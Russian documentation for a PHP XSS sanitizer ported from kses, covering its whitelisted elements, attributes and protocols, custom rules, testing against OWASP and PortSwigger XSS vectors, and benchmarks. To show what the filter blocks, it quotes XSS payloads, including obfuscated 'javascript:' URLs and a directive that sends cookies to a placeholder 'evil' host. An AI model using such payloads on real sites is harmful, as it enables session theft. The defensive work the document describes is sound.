# Введение

`Expansa\Security\Xss\Kses` — фильтр HTML от XSS: оставляет только разрешённые элементы, атрибуты
и протоколы ссылок, всё остальное удаляет или обезвреживает. Это порт
[kses](https://sourceforge.net/projects/kses), на котором построен `wp_kses()` в WordPress.

Обычно фильтр вызывается через `Sanitizer::markup()` (фасад `Safe`):

```php
use Expansa\Facades\Safe;

Safe::markup('<p onclick="steal()">Привет, <b>мир</b><script>alert(1)</script></p>');
// <p>Привет, <b>мир</b>alert(1)</p>
```

Фильтр — для HTML, который **должен** остаться разметкой: текст записи, описание, подпись. Для
обычного текста используйте `Safe::html()`, он экранирует всё.

## Что делает фильтр

| Вход                                       | Результат                                  |
|--------------------------------------------|--------------------------------------------|
| Неразрешённый элемент `<script>`, `<style>` | Тег удаляется, текст внутри остаётся        |
| Неразрешённый атрибут `onclick`, `style`   | Атрибут удаляется                          |
| Запрещённый протокол `javascript:`, `data:` | Протокол удаляется из значения             |
| Закрывающий тег с атрибутами `</div class>` | `</div>`                                  |
| Значение без кавычек `width=10`            | `width="10"`                               |
| Одиночные `<` и `>`                        | `&lt;` и `&gt;`                            |
| Комментарий `<!-- ... -->`                 | Удаляется                                  |
| Неверная сущность `AT&T`, `&#xZZ;`         | `AT&amp;T`, `&amp;#xZZ;`                   |
| Сущность Netscape `&{alert(1)};`           | Удаляется                                  |
| Символ NUL                                 | Удаляется                                  |
| Невалидный UTF-8                           | Пустая строка                              |

Имя элемента сохраняет регистр (`<DIV>`), имена атрибутов приводятся к нижнему регистру.

### Протоколы

Протокол ищется в начале **каждого** значения атрибута, не только `href` и `src`. Фильтр понимает
пробелы, регистр и сущности внутри протокола и любую запись двоеточия: `:`, `&#58;`, `&#0058;`,
`&#x3A;`, `&colon;`. Удаление повторяется, пока значение меняется, поэтому
`javascript:javascript:alert(1)` тоже очищается.

```php
Safe::markup('<a href="JaVa&#x09;script&colon;alert(1)">x</a>');   // <a href="alert(1)">x</a>
Safe::markup('<a href="HTTPS&colon;//example.com">x</a>');         // <a href="https://example.com">x</a>
```

Разрешены `ftp`, `http`, `https`, `irc`, `mailto`, `news`, `nntp`, `rtsp`, `sftp`, `ssh`, `tel`,
`telnet`, `webcal`. Относительные ссылки (`/page`, `#top`, `?a=1`) не содержат протокола и не
меняются.

Так как проверяются все атрибуты, текст до двоеточия в начале значения удаляется и там, где
протокола быть не может: `<img alt="Note: hi">` станет `<img alt="hi">`.

## Правила по умолчанию

Разрешённые элементы и атрибуты — в `Kses::ALLOWED_HTML` (по алфавиту), протоколы — в
`Kses::ALLOWED_PROTOCOLS`.

**Атрибуты любого элемента** (псевдоэлемент `*`): `class`, `title`, `lang`, `dir`, `role`,
`aria-*`, `data-*`. Поэтому `<p class="lead">`, `<code class="language-php">`, `<abbr title="…">`
сохраняют атрибуты.

**Элементы**, среди прочего:

- текст: `p`, `b`, `strong`, `i`, `em`, `u`, `s`, `small`, `mark`, `sub`, `sup`, `code`, `pre`,
  `kbd`, `samp`, `var`, `blockquote`, `q`, `abbr`, `cite`, `dfn`, `bdi`, `bdo`, `del`, `ins`,
  `time` (`datetime`), `data` (`value`), `h1`–`h6`, `hgroup`, `br`, `hr`, `wbr`;
- разделы: `article`, `aside`, `header`, `footer`, `main`, `nav`, `section`, `address`, `div`,
  `details` (`open`), `summary`, `figure`, `figcaption`;
- ссылки и медиа: `a` (`href`, `target`, `rel`, `download`…), `img` (`src`, `srcset`, `sizes`,
  `loading`, `decoding`…), `picture`, `source` (`src`, `srcset`, `sizes`, `media`, `type`),
  `audio`, `video` (`playsinline`, `poster`…), `track`, `iframe` (`src`, `allow`, `loading`,
  `referrerpolicy`, `sandbox`…);
- списки и таблицы: `ul`, `ol` (`start`, `reversed`, `type`), `li` (`value`), `dl`, `dt`, `dd`,
  `table`, `caption`, `colgroup`, `col` (`span`), `thead`, `tbody`, `tfoot`, `tr`, `th`, `td`;
- формы для отображения: `button`, `select`, `option`, `optgroup`, `label`, `fieldset`, `legend`,
  `meter`, `progress`.

Не разрешены нигде: `style`, обработчики событий `on*`, `srcdoc`, `formaction`, директивы youla
`u-*`. `iframe` разрешён с любым `src` на разрешённом протоколе — если встраивать можно только
доверенные сайты, уберите его из своих правил.

### Директивы youla

Значения директив youla (`u-select`, `u-text`, `u-bind`…) исполняются как JavaScript, а весь
дашборд — компонент youla (`<body u-data="youla">`). Если бы фильтр пропускал директивы, текст
пользователя вроде `<select u-select="fetch('//evil/?'+document.cookie)">` выполнился бы у
администратора. Поэтому директив нет в правилах по умолчанию, их добавляют только для доверенной
разметки, дополнительными правилами:

```php
Safe::markup($html, ['select' => ['u-select']]);
```

## Дополнительные правила

`Safe::markup($html, $allowedHtml)` и `Kses::extend($allowedHtml)` дополняют правила по умолчанию:
атрибуты добавляются к атрибутам элемента, новые элементы — к списку.

```php
use Expansa\Security\Xss\Kses;

$kses = new Kses(Kses::extend([
    'select' => ['u-select'],
    'x-card' => ['id'],
]));
```

`Safe::markup()` держит отдельный фильтр для каждого набора дополнительных правил, так что
повторные вызовы с тем же набором используют уже созданный фильтр.

## Свои правила

Чтобы заменить правила целиком, передайте их в конструктор:

```php
$kses = new Kses(
    allowedHtml: [
        '*'    => ['class', 'data-*'],
        'a'    => ['href', 'title' => ['maxlen' => 100]],
        'span' => ['class' => ['content' => ['icon-%']]],
        'b'    => [],
    ],
    allowedProtocols: ['https', 'mailto'],
);

$kses->apply($html);
```

Ключ — имя элемента в нижнем регистре, значение — его атрибуты. Пустой массив разрешает элемент без
своих атрибутов. Атрибуты `*` добавляются к каждому элементу, свои атрибуты элемента их
перекрывают. Имя атрибута, оканчивающееся на `*`, — это префикс: `data-*` разрешает `data-id`,
`data-lang` и другие, но не пустое `data-`.

Атрибут в списке (`'href'`) принимает любое значение, как и запись `'href' => 1`. Атрибут с
массивом проверок (`'title' => ['maxlen' => 100]`) остаётся, если проходит **хотя бы одну** из них.
Обе записи можно смешивать в одном элементе; если атрибут указан дважды, действует последняя запись.

| Проверка    | Значение       | Атрибут остаётся, если                                          |
|-------------|----------------|-----------------------------------------------------------------|
| `maxlen`    | число          | длина значения в байтах не больше                               |
| `minlen`    | число          | длина значения не меньше                                        |
| `maxval`    | число          | значение — целое до 6 цифр и не больше                          |
| `minval`    | число          | значение — целое до 6 цифр и не меньше                          |
| `valueless` | `'y'` или `'n'` | у атрибута нет значения (`y`, как `<option selected>`) или есть (`n`) |
| `content`   | массив строк   | значение содержит одну из строк, `%` — любой текст              |

Значение проверки неверного типа (`['maxlen' => 'many']`) выбрасывает `InvalidArgumentException`
при первом таком атрибуте.

Правила не меняются после создания фильтра, поэтому один экземпляр можно переиспользовать сколько
угодно — `Sanitizer::markup()` так и делает.

## Проверка на векторах атак

`tests/Kses.php` прогоняет через фильтр 149 векторов из
[OWASP XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
и PortSwigger (`tests/fixtures/xss-vectors.txt`, по одному на строку). Результат разбирается
HTML5-парсером PHP (`Dom\HTMLDocument`) так, как его разобрал бы браузер: в `body` и внутри строки
таблицы. Выход считается опасным, если в нём есть элемент вне белого списка или SVG/MathML,
атрибут `on*`, `style`, `srcdoc`, `formaction`, или URL-атрибут с протоколом вне белого списка —
после декодирования сущностей и удаления пробелов и управляющих символов, как делает браузер.

Та же проверка сначала применяется к самим векторам: 134 из 149 опасны без фильтра. Остальные
безвредны в современных браузерах: вектора для старых IE и Netscape, комментарии, CDATA, теги без
закрывающей `>`. После фильтра опасных не остаётся ни одного; прежняя версия пропускала три — все
через `&colon;` и `&#0058;`.

Проверка не заменяет политику: `iframe` с разрешённым протоколом встраивает любой сайт, а ссылка
с `target="_blank"` без `rel="noopener"` в старых браузерах даёт открытой странице доступ к
`window.opener` (современные считают такие ссылки `noopener` по умолчанию). Это не XSS, но если
такие случаи важны, сузьте правила.

## Исправленные ошибки

- `javascript&colon;alert(1)` и `javascript&#0058;alert(1)` проходили фильтр: не распознавались
  именованная сущность двоеточия и десятичные сущности с ведущими нулями;
- `Sanitizer::markup()` с числом падал с `TypeError`;
- сообщения об ошибке проверок `minlen`, `maxval`, `minval` говорили о `maxlen`, а `maxval` и
  `minval` сравнивали строку с пробелами вместо числа.

Во всём остальном результат побайтно совпадает с прежней версией: это проверено на 1.5 млн
случайных входов, включая битую разметку и невалидный UTF-8, а `tests/Kses.php` хранит эталонные
ответы прежней версии на 60 сложных случаях.

## Производительность

`php tests/benchmarks/Kses.php [--baseline=<git ref или файл>]` сравнивает с версией из коммита,
по умолчанию `HEAD`, и показывает, совпадает ли вывод.

Кэш тегов общий для процесса и не очищается, поэтому бенчмарк считает два случая:

- **без кэша** — кэш заранее заполнен другими тегами, ни один тег текста в него не попадает, даже
  повторяющийся внутри текста;
- **с кэшем** — теги этого текста уже встречались в процессе, как у полей, которые выводятся на
  каждой странице.

Ускорение относительно прежней версии, по нескольким прогонам:

| Вход                              | Без кэша | С кэшем |
|-----------------------------------|---------:|--------:|
| текст без разметки                |    ~2.5x |    ~6x  |
| текст с сущностями                |    ~1.9x |   ~2.3x |
| статья 5 КБ                       |    ~1.9x |    ~9x  |
| таблица с атрибутами              |    ~1.9x |   ~13x  |
| набор XSS-атак                    |    ~1.7x |   ~12x  |
| статья, все ссылки уникальны      |    ~1.9x |   ~10x  |
| `Sanitizer::markup()`, заголовок  |          |   ~2.5x |

Основные приёмы:

- текст без `<`, `>`, `&` и NUL возвращается сразу, после проверки UTF-8 через
  `mb_check_encoding()`;
- регулярки сущностей запускаются, только если в строке есть `&` (и `{` для сущностей Netscape);
- цепочка корректных атрибутов разбирается одним `preg_match_all`, пошаговый разбор kses включается
  только на повреждённом участке и идёт по смещению, без копирования строки;
- неразрешённые атрибуты отбрасываются при разборе, их значения не проверяются на протокол;
- значение без двоеточия и без сущностей двоеточия, а также значение с разрешённым протоколом,
  записанным как есть (`https://…`), не проходит через регулярку протоколов;
- теги без атрибутов (`<p>`, `</a>`) разбираются без регулярки;
- результат каждого тега до 256 байт кэшируется, до 1024 тегов на набор правил. Кэш общий для всех
  фильтров процесса и разделён по правилам: у стандартных правил свой раздел, у своих правил — раздел
  по их хешу, так что фильтр никогда не получит результат чужих правил.
